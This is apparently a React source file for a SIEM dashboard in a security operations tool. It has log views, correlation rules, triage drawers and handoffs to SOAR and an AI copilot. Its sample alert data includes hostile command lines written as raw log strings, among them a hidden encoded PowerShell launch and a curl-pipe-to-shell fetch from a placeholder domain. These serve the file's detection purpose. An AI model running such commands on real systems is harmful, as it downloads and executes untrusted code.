import { useEffect, useMemo, useState } from "react";
import API from "../api/api";
import INCIDENT_API from "../api/incidentApi";
import { saveCopilotContext } from "../utils/copilotContextBridge";

import {
  Activity,
  AlertTriangle,
  Brain,
  CheckCircle2,
  Cpu,
  Database,
  Download,
  Eye,
  FileSearch,
  Filter,
  Layers,
  Pause,
  Play,
  Radar,
  RefreshCcw,
  Search,
  ShieldAlert,
  ShieldCheck,
  Siren,
  Sparkles,
  Terminal,
  TrendingUp,
  UserCheck,
  Workflow,
  Zap,
  X,
} from "lucide-react";

import {
  Area,
  Bar,
  BarChart,
  Cell,
  ComposedChart,
  Line,
  Pie,
  PieChart,
  ResponsiveContainer,
  Tooltip,
  XAxis,
  YAxis,
} from "recharts";

const SAMPLE_LOGS = [
  {
    id: "SIEM-LOG-1001",
    timestamp: "2026-07-17 00:31:10",
    title: "PowerShell Execution",
    source: "Windows Event Log",
    host: "FINANCE-PC-04",
    user: "finance.user",
    ip: "10.10.4.21",
    severity: "High",
    status: "Open",
    tactic: "Execution",
    technique: "T1059",
    rule: "Suspicious PowerShell command pattern",
    category: "Endpoint",
    risk: 82,
    confidence: 91,
    raw: "powershell.exe -nop -w hidden -enc <base64>",
  },
  {
    id: "SIEM-LOG-1002",
    timestamp: "2026-07-17 00:29:42",
    title: "SSH Brute Force",
    source: "Linux Auth Log",
    host: "SOC-JUMP-01",
    user: "root",
    ip: "185.220.101.44",
    severity: "Critical",
    status: "Escalated",
    tactic: "Credential Access",
    technique: "T1110",
    rule: "Multiple failed SSH login attempts",
    category: "Network",
    risk: 96,
    confidence: 94,
    raw: "Failed password for root from 185.220.101.44 port 51422 ssh2",
  },
  {
    id: "SIEM-LOG-1003",
    timestamp: "2026-07-17 00:27:18",
    title: "Suspicious Admin Login",
    source: "IAM Logs",
    host: "Identity Provider",
    user: "admin",
    ip: "45.155.205.233",
    severity: "High",
    status: "Investigating",
    tactic: "Initial Access",
    technique: "T1078",
    rule: "Admin login from unusual country",
    category: "Identity",
    risk: 88,
    confidence: 87,
    raw: "Admin login successful from new ASN and unusual geo-location",
  },
  {
    id: "SIEM-LOG-1004",
    timestamp: "2026-07-17 00:23:44",
    title: "Command Execution",
    source: "EDR Telemetry",
    host: "DEV-SERVER-02",
    user: "svc-deploy",
    ip: "10.10.8.19",
    severity: "Medium",
    status: "Open",
    tactic: "Execution",
    technique: "T1059",
    rule: "Shell command spawned by service account",
    category: "Endpoint",
    risk: 64,
    confidence: 74,
    raw: "/bin/bash -c curl http://unknown-domain/payload.sh | sh",
  },
  {
    id: "SIEM-LOG-1005",
    timestamp: "2026-07-17 00:18:02",
    title: "Possible Data Exfiltration",
    source: "Firewall Logs",
    host: "DB-SERVER-01",
    user: "db-service",
    ip: "10.10.2.15",
    severity: "Critical",
    status: "Open",
    tactic: "Exfiltration",
    technique: "T1041",
    rule: "Large outbound transfer to unknown IP",
    category: "Network",
    risk: 93,
    confidence: 89,
    raw: "Outbound transfer 3.8GB to external IP 91.240.118.172",
  },
];

const LOG_TREND = [
  { time: "00:00", logs: 41, alerts: 5 },
  { time: "00:05", logs: 62, alerts: 9 },
  { time: "00:10", logs: 55, alerts: 7 },
  { time: "00:15", logs: 76, alerts: 12 },
  { time: "00:20", logs: 69, alerts: 10 },
  { time: "00:25", logs: 91, alerts: 16 },
  { time: "00:30", logs: 84, alerts: 13 },
];

const SEVERITY_DATA = [
  { name: "Critical", value: 2 },
  { name: "High", value: 2 },
  { name: "Medium", value: 1 },
  { name: "Low", value: 0 },
];

const SEVERITY_COLORS = ["#ff4d6d", "#ff9f1c", "#ffd166", "#00ffaa"];

const MITRE_DATA = [
  { technique: "T1059", count: 2 },
  { technique: "T1110", count: 1 },
  { technique: "T1078", count: 1 },
  { technique: "T1041", count: 1 },
];

const SOURCE_DATA = [
  { source: "EDR", events: 31 },
  { source: "Firewall", events: 26 },
  { source: "IAM", events: 18 },
  { source: "Linux", events: 21 },
  { source: "Windows", events: 37 },
];

const CORRELATION_RULES = [
  {
    id: "CORR-001",
    name: "Credential Attack Chain",
    logic: "Failed login burst + successful admin login + unusual ASN",
    severity: "Critical",
    status: "Enabled",
    mapped: "T1110, T1078",
    confidence: 92,
  },
  {
    id: "CORR-002",
    name: "Suspicious Script Execution",
    logic: "PowerShell encoded command + outbound network call",
    severity: "High",
    status: "Enabled",
    mapped: "T1059",
    confidence: 88,
  },
  {
    id: "CORR-003",
    name: "Possible Exfiltration",
    logic: "Large outbound transfer + sensitive asset + unknown destination",
    severity: "Critical",
    status: "Enabled",
    mapped: "T1041",
    confidence: 89,
  },
];

const HEALTH = [
  { name: "Log Collector", status: "Operational" },
  { name: "Correlation Engine", status: "Operational" },
  { name: "Threat Intel Enrichment", status: "Operational" },
  { name: "UEBA Engine", status: "Operational" },
  { name: "SOAR Handoff", status: "Operational" },
  { name: "AI SIEM Analyst", status: "Operational" },
  { name: "Database", status: "Operational" },
];

const RECOMMENDATIONS = [
  "Block source IP 185.220.101.44 on perimeter firewall.",
  "Review admin login activity and enforce MFA verification.",
  "Create incident for possible exfiltration from DB-SERVER-01.",
  "Run endpoint isolation workflow for FINANCE-PC-04.",
  "Tune correlation rule CORR-001 for credential attack chain.",
];

function severityClass(value = "") {
  const item = String(value).toLowerCase();

  if (item.includes("critical")) return "critical";
  if (item.includes("high")) return "high";
  if (item.includes("medium")) return "medium";
  return "low";
}

function riskClass(value = 0) {
  if (value >= 90) return "critical";
  if (value >= 75) return "high";
  if (value >= 55) return "medium";
  return "low";
}

function downloadJson(filename, data) {
  const blob = new Blob([JSON.stringify(data, null, 2)], {
    type: "application/json",
  });

  const url = URL.createObjectURL(blob);
  const element = document.createElement("a");

  element.href = url;
  element.download = filename;
  element.click();

  URL.revokeObjectURL(url);
}

function KpiCard({ icon: Icon, label, value, helper, tone = "blue" }) {
  return (
    <div className={`siem-v2-kpi ${tone}`}>
      <div>
        <Icon size={20} />
      </div>

      <span>{label}</span>
      <b>{value}</b>
      <small>{helper}</small>
    </div>
  );
}

function ThreatIntelItem({ label, value, status }) {
  return (
    <div className="siem-v2-intel-item">
      <div>
        <Database size={15} />
      </div>

      <section>
        <span>{label}</span>
        <b>{value}</b>
      </section>

      <small>{status}</small>
    </div>
  );
}

function LogRow({ log, selected, onClick }) {
  return (
    <button
      className={selected ? "siem-v2-log-row active" : "siem-v2-log-row"}
      onClick={onClick}
    >
      <div className={`siem-v2-log-icon ${severityClass(log.severity)}`}>
        <Terminal size={16} />
      </div>

      <section>
        <div>
          <b>{log.title}</b>
          <span className={`siem-v2-severity ${severityClass(log.severity)}`}>
            {log.severity}
          </span>
        </div>

        <p>{log.rule}</p>

        <small>
          {log.timestamp} · {log.host} · {log.user} · {log.ip}
        </small>
      </section>

      <span className={`siem-v2-risk-pill ${riskClass(log.risk)}`}>
        {log.risk}
      </span>
    </button>
  );
}

function TriageInfo({ label, value }) {
  return (
    <div className="siem-triage-info">
      <span>{label}</span>
      <b>{value || "N/A"}</b>
    </div>
  );
}

function SIEMTriageDrawer({
  log,
  notice,
  onClose,
  onCreateIncident,
  onRunSOAR,
  onAskAI,
  onExport,
}) {
  if (!log) return null;

  const timeline = [
    {
      title: "Event Detected",
      desc: `${log.source} generated a security event from ${log.host}.`,
      icon: Terminal,
    },
    {
      title: "Risk Scored",
      desc: `SpectraSOC assigned ${log.risk}/100 risk with ${log.confidence}% confidence.`,
      icon: TrendingUp,
    },
    {
      title: "MITRE Mapped",
      desc: `Mapped to ${log.technique} under ${log.tactic}.`,
      icon: Radar,
    },
    {
      title: "Triage Required",
      desc: "Analyst should validate the IOC, affected asset, and user activity.",
      icon: ShieldAlert,
    },
  ];

  const recommendedActions = [
    `Review activity for user ${log.user}.`,
    `Validate source IP ${log.ip} with threat intelligence.`,
    `Check related logs from host ${log.host}.`,
    `Map activity to MITRE technique ${log.technique}.`,
    "Create incident if activity is confirmed malicious.",
    "Run SOAR playbook only after analyst approval.",
  ];

  return (
    <div className="siem-triage-overlay">
      <aside className="siem-triage-drawer">
        <div className="siem-triage-header">
          <div>
            <span className="hero-chip">
              <FileSearch size={15} />
              Alert Triage
            </span>

            <h2>{log.title}</h2>

            <p>
              Enterprise investigation view for SIEM alert validation,
              enrichment, response planning, AI analysis, and case handoff.
            </p>
          </div>

          <button className="siem-triage-close" onClick={onClose}>
            <X size={18} />
          </button>
        </div>

        {notice && (
          <div className="siem-triage-notice">
            <CheckCircle2 size={16} />
            <span>{notice}</span>
          </div>
        )}

        <div className="siem-triage-risk-row">
          <div>
            <span className={`siem-v2-severity ${severityClass(log.severity)}`}>
              {log.severity}
            </span>

            <h3>Risk Score</h3>
            <b>{log.risk}/100</b>
          </div>

          <div>
            <span>Confidence</span>
            <h3>Detection Confidence</h3>
            <b>{log.confidence}%</b>
          </div>

          <div>
            <span>Status</span>
            <h3>Current State</h3>
            <b>{log.status}</b>
          </div>
        </div>

        <div className="siem-triage-section">
          <div className="siem-triage-section-head">
            <h3>Event Context</h3>
            <span>{log.id}</span>
          </div>

          <div className="siem-triage-info-grid">
            <TriageInfo label="Timestamp" value={log.timestamp} />
            <TriageInfo label="Source" value={log.source} />
            <TriageInfo label="Host" value={log.host} />
            <TriageInfo label="User" value={log.user} />
            <TriageInfo label="Source IP / IOC" value={log.ip} />
            <TriageInfo label="Category" value={log.category} />
            <TriageInfo label="Tactic" value={log.tactic} />
            <TriageInfo label="Technique" value={log.technique} />
          </div>
        </div>

        <div className="siem-triage-section">
          <div className="siem-triage-section-head">
            <h3>Detection Rule</h3>
            <span>Matched</span>
          </div>

          <div className="siem-triage-rule-box">
            <ShieldCheck size={17} />
            <div>
              <b>{log.rule}</b>
              <p>
                This rule indicates suspicious behavior that should be reviewed
                by an analyst before escalation.
              </p>
            </div>
          </div>
        </div>

        <div className="siem-triage-section">
          <div className="siem-triage-section-head">
            <h3>Investigation Timeline</h3>
            <span>{timeline.length} steps</span>
          </div>

          <div className="siem-triage-timeline">
            {timeline.map((item, index) => {
              const Icon = item.icon;

              return (
                <div key={item.title} className="siem-triage-timeline-item">
                  <div>
                    <Icon size={15} />
                  </div>

                  <section>
                    <b>{item.title}</b>
                    <p>{item.desc}</p>
                  </section>

                  <small>Step {index + 1}</small>
                </div>
              );
            })}
          </div>
        </div>

        <div className="siem-triage-section">
          <div className="siem-triage-section-head">
            <h3>Recommended Analyst Actions</h3>
            <Sparkles size={17} />
          </div>

          <div className="siem-triage-actions-list">
            {recommendedActions.map((action) => (
              <div key={action}>
                <CheckCircle2 size={15} />
                <span>{action}</span>
              </div>
            ))}
          </div>
        </div>

        <div className="siem-triage-section">
          <div className="siem-triage-section-head">
            <h3>Raw Log</h3>
            <span>Original Event</span>
          </div>

          <pre className="siem-triage-raw">{log.raw}</pre>
        </div>

        <div className="siem-triage-footer">
          <button onClick={() => onCreateIncident(log)}>
            <ShieldAlert size={15} />
            Create Incident
          </button>

          <button onClick={() => onRunSOAR(log)}>
            <Workflow size={15} />
            Run SOAR
          </button>

          <button onClick={() => onAskAI(log)}>
            <Brain size={15} />
            Ask AI Analyst
          </button>

          <button onClick={() => onExport(log)}>
            <Download size={15} />
            Export Triage
          </button>
        </div>
      </aside>
    </div>
  );
}

export default function SIEM({ role, setPage }) {
  const [activeTab, setActiveTab] = useState("overview");
  const [logs, setLogs] = useState(SAMPLE_LOGS);
  const [selectedLog, setSelectedLog] = useState(SAMPLE_LOGS[0]);
  const [triageOpen, setTriageOpen] = useState(false);
  const [triageNotice, setTriageNotice] = useState("");
  const [query, setQuery] = useState("");
  const [severity, setSeverity] = useState("All");
  const [source, setSource] = useState("All");
  const [liveMode, setLiveMode] = useState(true);

  useEffect(() => {
    loadLogs();
  }, []);

  const loadLogs = async () => {
    try {
      const res = await API.get("/api/v1/siem/logs");

      const data = Array.isArray(res.data)
        ? res.data
        : res.data.logs || res.data.records || [];

      if (data.length > 0) {
        const formatted = data.map((item, index) => ({
          id: item.id || item.log_id || `SIEM-LOG-${index + 1}`,
          timestamp:
            item.timestamp || item.created_at || new Date().toISOString(),
          title: item.title || item.event_type || item.name || "Security Event",
          source: item.source || item.log_source || "Unknown Source",
          host: item.host || item.hostname || "Unknown Host",
          user: item.user || item.username || "Unknown User",
          ip: item.ip || item.src_ip || item.source_ip || "N/A",
          severity: item.severity || item.risk_level || "Low",
          status: item.status || "Open",
          tactic: item.tactic || "Unknown",
          technique: item.technique || item.mitre || "N/A",
          rule: item.rule || item.description || "No rule description",
          category: item.category || "General",
          risk: item.risk || item.score || 35,
          confidence: item.confidence || 70,
          raw: item.raw || JSON.stringify(item),
        }));

        setLogs(formatted);
        setSelectedLog(formatted[0]);
      }
    } catch (error) {
      console.log("Using SIEM fallback data because API failed", error);
    }
  };

  const metrics = useMemo(() => {
    const critical = logs.filter(
      (log) => severityClass(log.severity) === "critical"
    ).length;

    const high = logs.filter(
      (log) => severityClass(log.severity) === "high"
    ).length;

    const avgRisk = Math.round(
      logs.reduce((sum, log) => sum + Number(log.risk || 0), 0) /
        Math.max(logs.length, 1)
    );

    return {
      total: logs.length,
      critical,
      high,
      avgRisk,
      correlations: CORRELATION_RULES.length,
      suspiciousUsers: new Set(logs.map((log) => log.user)).size,
    };
  }, [logs]);

  const filteredLogs = useMemo(() => {
    const search = query.toLowerCase();

    return logs.filter((log) => {
      const matchesQuery =
        !search ||
        [
          log.title,
          log.source,
          log.host,
          log.user,
          log.ip,
          log.severity,
          log.technique,
          log.rule,
          log.raw,
        ]
          .join(" ")
          .toLowerCase()
          .includes(search);

      const matchesSeverity =
        severity === "All" ||
        String(log.severity).toLowerCase() === severity.toLowerCase();

      const matchesSource =
        source === "All" ||
        String(log.source).toLowerCase().includes(source.toLowerCase());

      return matchesQuery && matchesSeverity && matchesSource;
    });
  }, [logs, query, severity, source]);

  const exportSIEMReport = () => {
    downloadJson("spectrasoc-siem-report.json", {
      exported_at: new Date().toISOString(),
      role,
      metrics,
      filters: { query, severity, source },
      logs: filteredLogs,
      correlation_rules: CORRELATION_RULES,
      recommendations: RECOMMENDATIONS,
    });
  };

  const openTriage = (log) => {
    setSelectedLog(log);
    setTriageNotice("");
    setTriageOpen(true);
  };

  const createIncidentDraft = async (log) => {
    try {
      const incident = await INCIDENT_API.createFromSIEMAlert(log);

      setTriageNotice(
        `Incident ${incident.id} created successfully from SIEM alert. Opening Incident Command Center...`
      );

      setTimeout(() => {
        if (typeof setPage === "function") {
          setPage("incidents");
        }
      }, 900);
    } catch (error) {
      console.error(error);

      setTriageNotice(
        "Failed to create incident from SIEM alert. Please check incident API connection."
      );
    }
  };

  const runSOARDraft = (log) => {
    const severityLevel = severityClass(log.severity);

    const recommendedPlaybook =
      severityLevel === "critical"
        ? "Critical SIEM Alert Containment"
        : severityLevel === "high"
          ? "High-Risk Alert Investigation"
          : "Standard SIEM Alert Triage";

    const soarHandoff = {
      source: "SIEM",
      source_log_id: log.id,
      alert_title: log.title,
      alert: log,

      recommended_playbook: recommendedPlaybook,
      severity: log.severity,
      risk_score: log.risk,
      confidence: log.confidence,

      approval_required: true,
      status: "Pending Analyst Approval",

      suggested_actions: [
        "Enrich IOC with threat intelligence",
        "Check affected asset context",
        "Validate user activity",
        "Search related logs across SIEM",
        "Create incident if confirmed malicious",
        "Block malicious IP only after approval",
      ],

      connector_plan: [
        {
          connector: "Threat Intelligence",
          action: "Enrich IOC",
          target: log.ip,
          risk: "Safe",
        },
        {
          connector: "SIEM",
          action: "Search related events",
          target: log.host,
          risk: "Safe",
        },
        {
          connector: "EDR",
          action: "Check endpoint telemetry",
          target: log.host,
          risk: "Medium",
        },
        {
          connector: "Firewall",
          action: "Block source IP",
          target: log.ip,
          risk: "High - Requires Approval",
        },
      ],

      mitre: {
        tactic: log.tactic,
        technique: log.technique,
      },

      created_at: new Date().toISOString(),
    };

    localStorage.setItem(
      "spectrasoc_siem_soar_handoff",
      JSON.stringify(soarHandoff)
    );

    localStorage.setItem(
      "spectrasoc_siem_soar_draft",
      JSON.stringify(soarHandoff)
    );

    setTriageNotice(
      "SOAR handoff prepared from SIEM alert. Opening SOAR Automation..."
    );

    setTimeout(() => {
      if (typeof setPage === "function") {
        setPage("soar");
      }
    }, 900);
  };

  const askAIAnalyst = (log) => {
    const now = new Date().toISOString();

    const siemCopilotContext = {
      source: "SIEM Alert Triage",
      sent_at: now,

      incident_id: log.id,
      title: log.title,
      severity: log.severity,
      status: log.status,
      category: log.category,
      detection_source: log.source,
      assigned_to: "SOC Analyst",

      risk_score: log.risk,
      confidence: log.confidence,

      description: log.rule,

      siem_alert: {
        id: log.id,
        timestamp: log.timestamp,
        source: log.source,
        host: log.host,
        user: log.user,
        ip: log.ip,
        severity: log.severity,
        status: log.status,
        tactic: log.tactic,
        technique: log.technique,
        rule: log.rule,
        category: log.category,
        risk: log.risk,
        confidence: log.confidence,
        raw: log.raw,
      },

      tags: [
        "siem",
        "alert-triage",
        log.technique || "mitre",
        String(log.category || "security").toLowerCase(),
      ],

      evidence: [
        {
          id: `SIEM-EV-${Date.now()}`,
          type: "SIEM Log",
          name: `Raw SIEM Event - ${log.id}`,
          source: log.source,
          value: log.raw,
          status: "Attached",
          collected_at: now,
        },
      ],

      timeline: [
        {
          id: `SIEM-TL-${Date.now()}-1`,
          type: "Detection",
          title: "SIEM alert detected",
          description: `${log.title} was detected from ${log.source}.`,
          timestamp: log.timestamp,
          source: "SIEM",
        },
        {
          id: `SIEM-TL-${Date.now()}-2`,
          type: "AI Analysis Requested",
          title: "Analyst requested AI SIEM review",
          description:
            "SIEM alert context was sent to SpectraSOC AI Copilot for investigation guidance.",
          timestamp: now,
          source: "SpectraSOC",
        },
      ],

      ai_task: {
        title: "Analyze SIEM alert",
        expected_output: [
          "Explain what this alert means",
          "Assess the risk and confidence",
          "Map the behavior to MITRE ATT&CK",
          "Recommend evidence to collect",
          "Recommend containment actions",
          "Suggest whether an incident should be created",
          "Suggest whether a SOAR playbook should be executed",
        ],
      },
    };

    saveCopilotContext(siemCopilotContext);

    localStorage.setItem(
      "spectrasoc_siem_ai_context",
      JSON.stringify(siemCopilotContext)
    );

    setTriageNotice("AI SIEM Analyst context prepared. Opening AI Assistant...");

    setTimeout(() => {
      if (typeof setPage === "function") {
        setPage("assistant");
      }
    }, 900);
  };

  const exportTriagePackage = (log) => {
    downloadJson(`spectrasoc-triage-${log.id}.json`, {
      exported_at: new Date().toISOString(),
      alert: log,
      recommended_actions: [
        `Review activity for user ${log.user}`,
        `Validate source IP ${log.ip}`,
        `Check related host logs for ${log.host}`,
        `Map activity to ${log.technique}`,
        "Escalate if confirmed malicious",
      ],
    });

    setTriageNotice("Triage package exported successfully.");
  };

  return (
    <div className="siem-v2-page">
      <section className="siem-v2-hero spectra-glass-card">
        <div>
          <span className="hero-chip">
            <ShieldAlert size={15} />
            Enterprise SIEM
          </span>

          <h1>SIEM Command Center</h1>

          <p>
            Real-time log monitoring, threat correlation, MITRE ATT&CK mapping,
            UEBA visibility, zero-day suspicion analytics, AI alert analysis,
            threat intelligence enrichment, and SOAR-ready investigation
            workflows.
          </p>

          <div className="siem-v2-actions">
            <button onClick={() => setLiveMode((prev) => !prev)}>
              {liveMode ? <Pause size={15} /> : <Play size={15} />}
              {liveMode ? "Pause Live Mode" : "Resume Live Mode"}
            </button>

            <button onClick={loadLogs}>
              <RefreshCcw size={15} />
              Refresh Logs
            </button>

            <button onClick={exportSIEMReport}>
              <Download size={15} />
              Export SIEM Report
            </button>
          </div>
        </div>

        <div className="siem-v2-status-card">
          <Activity size={24} />
          <span>SIEM Status</span>
          <b>{liveMode ? "Live Monitoring" : "Paused"}</b>
          <small>Correlation engine connected</small>
        </div>
      </section>

      <section className="siem-v2-tabs">
        {[
          ["overview", "Overview"],
          ["logs", "Log Explorer"],
          ["correlation", "Correlation"],
          ["ueba", "UEBA"],
        ].map(([id, label]) => (
          <button
            key={id}
            className={activeTab === id ? "active" : ""}
            onClick={() => setActiveTab(id)}
          >
            {label}
          </button>
        ))}
      </section>

      <section className="siem-v2-kpi-grid">
        <KpiCard
          icon={Database}
          label="Total Logs"
          value={metrics.total}
          helper="Normalized events"
          tone="blue"
        />

        <KpiCard
          icon={Siren}
          label="Critical Logs"
          value={metrics.critical}
          helper="Immediate review"
          tone="red"
        />

        <KpiCard
          icon={AlertTriangle}
          label="High Risk Logs"
          value={metrics.high}
          helper="Needs triage"
          tone="orange"
        />

        <KpiCard
          icon={Layers}
          label="Correlation Rules"
          value={metrics.correlations}
          helper="Active detections"
          tone="green"
        />

        <KpiCard
          icon={UserCheck}
          label="Suspicious Users"
          value={metrics.suspiciousUsers}
          helper="Identity analytics"
          tone="purple"
        />

        <KpiCard
          icon={TrendingUp}
          label="Average Risk"
          value={metrics.avgRisk}
          helper="Risk weighted"
          tone="yellow"
        />
      </section>

      {activeTab === "overview" && (
        <>
          <section className="siem-v2-main-grid">
            <div className="spectra-glass-card siem-v2-panel large">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>Live Event Stream</h2>
                  <p>
                    Real-time normalized security events and high-risk
                    detections.
                  </p>
                </div>

                <span>{liveMode ? "Streaming" : "Paused"}</span>
              </div>

              <div className="siem-v2-log-list">
                {filteredLogs.map((log) => (
                  <LogRow
                    key={log.id}
                    log={log}
                    selected={selectedLog?.id === log.id}
                    onClick={() => openTriage(log)}
                  />
                ))}
              </div>
            </div>

            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>Selected Event</h2>
                  <p>Investigation context and event intelligence.</p>
                </div>

                <Eye size={18} />
              </div>

              {selectedLog && (
                <div className="siem-v2-selected-event">
                  <span
                    className={`siem-v2-severity ${severityClass(
                      selectedLog.severity
                    )}`}
                  >
                    {selectedLog.severity}
                  </span>

                  <h3>{selectedLog.title}</h3>
                  <p>{selectedLog.rule}</p>

                  <div className="siem-v2-selected-grid">
                    <div>
                      <span>Host</span>
                      <b>{selectedLog.host}</b>
                    </div>

                    <div>
                      <span>User</span>
                      <b>{selectedLog.user}</b>
                    </div>

                    <div>
                      <span>Source IP</span>
                      <b>{selectedLog.ip}</b>
                    </div>

                    <div>
                      <span>MITRE</span>
                      <b>{selectedLog.technique}</b>
                    </div>

                    <div>
                      <span>Risk</span>
                      <b>{selectedLog.risk}/100</b>
                    </div>

                    <div>
                      <span>Confidence</span>
                      <b>{selectedLog.confidence}%</b>
                    </div>
                  </div>

                  <div className="siem-v2-raw-box">
                    <span>Raw Log</span>
                    <code>{selectedLog.raw}</code>
                  </div>
                </div>
              )}
            </div>
          </section>

          <section className="siem-v2-chart-grid">
            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>Log Volume Trend</h2>
                  <p>Log activity and alert count over time.</p>
                </div>
              </div>

              <ResponsiveContainer width="100%" height={280}>
                <ComposedChart data={LOG_TREND}>
                  <XAxis dataKey="time" />
                  <YAxis />
                  <Tooltip />

                  <Area
                    type="monotone"
                    dataKey="logs"
                    stroke="#00d5ff"
                    fill="#00d5ff33"
                    strokeWidth={3}
                  />

                  <Line
                    type="monotone"
                    dataKey="alerts"
                    stroke="#ff4d6d"
                    strokeWidth={3}
                  />
                </ComposedChart>
              </ResponsiveContainer>
            </div>

            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>Severity Distribution</h2>
                  <p>Current SIEM severity split.</p>
                </div>
              </div>

              <ResponsiveContainer width="100%" height={280}>
                <PieChart>
                  <Pie
                    data={SEVERITY_DATA}
                    dataKey="value"
                    nameKey="name"
                    innerRadius={58}
                    outerRadius={95}
                    paddingAngle={4}
                  >
                    {SEVERITY_DATA.map((entry, index) => (
                      <Cell
                        key={entry.name}
                        fill={SEVERITY_COLORS[index % SEVERITY_COLORS.length]}
                      />
                    ))}
                  </Pie>

                  <Tooltip />
                </PieChart>
              </ResponsiveContainer>
            </div>
          </section>

          <section className="siem-v2-bottom-grid">
            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>Threat Intelligence Context</h2>
                  <p>IOC enrichment and attacker context for selected event.</p>
                </div>

                <span>Connected</span>
              </div>

              <div className="siem-v2-intel-list">
                <ThreatIntelItem
                  label="High Risk IOC"
                  value={selectedLog?.ip || "N/A"}
                  status="Matched"
                />

                <ThreatIntelItem
                  label="Top Category"
                  value={selectedLog?.category || "N/A"}
                  status="Observed"
                />

                <ThreatIntelItem
                  label="MITRE Technique"
                  value={selectedLog?.technique || "N/A"}
                  status="Mapped"
                />

                <ThreatIntelItem
                  label="Asset Context"
                  value={selectedLog?.host || "N/A"}
                  status="Tracked"
                />
              </div>
            </div>

            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>SpectraSOC Recommendations</h2>
                  <p>Priority analyst actions based on SIEM telemetry.</p>
                </div>

                <Sparkles size={18} />
              </div>

              <div className="siem-v2-recommendations">
                {RECOMMENDATIONS.map((item) => (
                  <div key={item}>
                    <CheckCircle2 size={15} />
                    <span>{item}</span>
                  </div>
                ))}
              </div>
            </div>
          </section>
        </>
      )}

      {activeTab === "logs" && (
        <section className="spectra-glass-card siem-v2-panel">
          <div className="siem-v2-panel-head">
            <div>
              <h2>Advanced Log Explorer</h2>
              <p>Search, filter, review, and export normalized security events.</p>
            </div>

            <Filter size={18} />
          </div>

          <div className="siem-v2-filter-bar">
            <div className="siem-v2-search">
              <Search size={16} />

              <input
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                placeholder="Search by user, host, IOC, MITRE, rule, raw log..."
              />
            </div>

            <select
              value={severity}
              onChange={(e) => setSeverity(e.target.value)}
            >
              <option>All</option>
              <option>Critical</option>
              <option>High</option>
              <option>Medium</option>
              <option>Low</option>
            </select>

            <select value={source} onChange={(e) => setSource(e.target.value)}>
              <option>All</option>
              <option>Windows</option>
              <option>Linux</option>
              <option>EDR</option>
              <option>Firewall</option>
              <option>IAM</option>
            </select>
          </div>

          <div className="siem-v2-table-wrap">
            <table className="siem-v2-table">
              <thead>
                <tr>
                  <th>Timestamp</th>
                  <th>Event</th>
                  <th>Source</th>
                  <th>Host</th>
                  <th>User</th>
                  <th>Severity</th>
                  <th>MITRE</th>
                  <th>Risk</th>
                  <th>Status</th>
                </tr>
              </thead>

              <tbody>
                {filteredLogs.map((log) => (
                  <tr key={log.id} onClick={() => openTriage(log)}>
                    <td>{log.timestamp}</td>
                    <td>{log.title}</td>
                    <td>{log.source}</td>
                    <td>{log.host}</td>
                    <td>{log.user}</td>
                    <td>
                      <span
                        className={`siem-v2-severity ${severityClass(
                          log.severity
                        )}`}
                      >
                        {log.severity}
                      </span>
                    </td>
                    <td>{log.technique}</td>
                    <td>{log.risk}</td>
                    <td>{log.status}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "correlation" && (
        <>
          <section className="siem-v2-correlation-grid">
            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>Correlation Rules</h2>
                  <p>
                    Detection logic for attacker behavior and multi-stage
                    activity.
                  </p>
                </div>

                <Workflow size={18} />
              </div>

              <div className="siem-v2-rule-list">
                {CORRELATION_RULES.map((rule) => (
                  <div key={rule.id} className="siem-v2-rule-card">
                    <div>
                      <span
                        className={`siem-v2-severity ${severityClass(
                          rule.severity
                        )}`}
                      >
                        {rule.severity}
                      </span>

                      <b>{rule.name}</b>
                      <p>{rule.logic}</p>

                      <small>
                        {rule.id} · {rule.mapped}
                      </small>
                    </div>

                    <section>
                      <span>Confidence</span>
                      <b>{rule.confidence}%</b>
                    </section>
                  </div>
                ))}
              </div>
            </div>

            <div className="spectra-glass-card siem-v2-panel">
              <div className="siem-v2-panel-head">
                <div>
                  <h2>MITRE ATT&CK Coverage</h2>
                  <p>Mapped detections by technique.</p>
                </div>
              </div>

              <ResponsiveContainer width="100%" height={320}>
                <BarChart data={MITRE_DATA}>
                  <XAxis dataKey="technique" />
                  <YAxis />
                  <Tooltip />
                  <Bar dataKey="count" fill="#00ffaa" radius={[8, 8, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </section>

          <section className="spectra-glass-card siem-v2-panel">
            <div className="siem-v2-panel-head">
              <div>
                <h2>Log Source Coverage</h2>
                <p>Ingest visibility across security telemetry sources.</p>
              </div>
            </div>

            <ResponsiveContainer width="100%" height={280}>
              <BarChart data={SOURCE_DATA}>
                <XAxis dataKey="source" />
                <YAxis />
                <Tooltip />
                <Bar dataKey="events" fill="#00d5ff" radius={[8, 8, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </section>
        </>
      )}

      {activeTab === "ueba" && (
        <section className="siem-v2-bottom-grid">
          <div className="spectra-glass-card siem-v2-panel">
            <div className="siem-v2-panel-head">
              <div>
                <h2>UEBA Risk Watch</h2>
                <p>User and entity behavior analytics for abnormal actions.</p>
              </div>

              <Brain size={18} />
            </div>

            <div className="siem-v2-ueba-grid">
              <div>
                <UserCheck size={18} />
                <span>Risky User</span>
                <b>{selectedLog?.user || "admin"}</b>
              </div>

              <div>
                <Cpu size={18} />
                <span>Risky Asset</span>
                <b>{selectedLog?.host || "FINANCE-PC-04"}</b>
              </div>

              <div>
                <Radar size={18} />
                <span>Behavior Score</span>
                <b>81%</b>
              </div>

              <div>
                <Zap size={18} />
                <span>Zero-Day Suspicion</span>
                <b>2 Signals</b>
              </div>
            </div>

            <div className="siem-v2-zero-day-bar">
              <span>Unknown IOC + abnormal behavior + unusual execution chain</span>
              <i style={{ width: "81%" }} />
            </div>
          </div>

          <div className="spectra-glass-card siem-v2-panel">
            <div className="siem-v2-panel-head">
              <div>
                <h2>SOC Health</h2>
                <p>SIEM pipeline and connected engine health.</p>
